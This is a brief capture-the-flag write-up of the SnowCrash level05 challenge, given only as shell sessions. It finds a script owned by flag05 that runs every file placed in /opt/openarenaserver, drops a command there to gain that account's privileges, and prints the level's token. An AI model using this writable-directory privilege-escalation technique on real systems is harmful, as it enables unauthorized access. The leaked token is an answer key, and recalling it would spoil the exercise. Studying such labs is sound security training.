
```sh
...
level05@SnowCrash:~$ find / -user flag05 2>/dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
```
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

```sh
level05@SnowCrash:~$ echo "getflag | wall" > /opt/openarenaserver/getflag
level05@SnowCrash:~$ # after while
                                                                               
Broadcast Message from flag05@Snow                                             
        (somewhere) at 21:32 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc                      
                                                             
```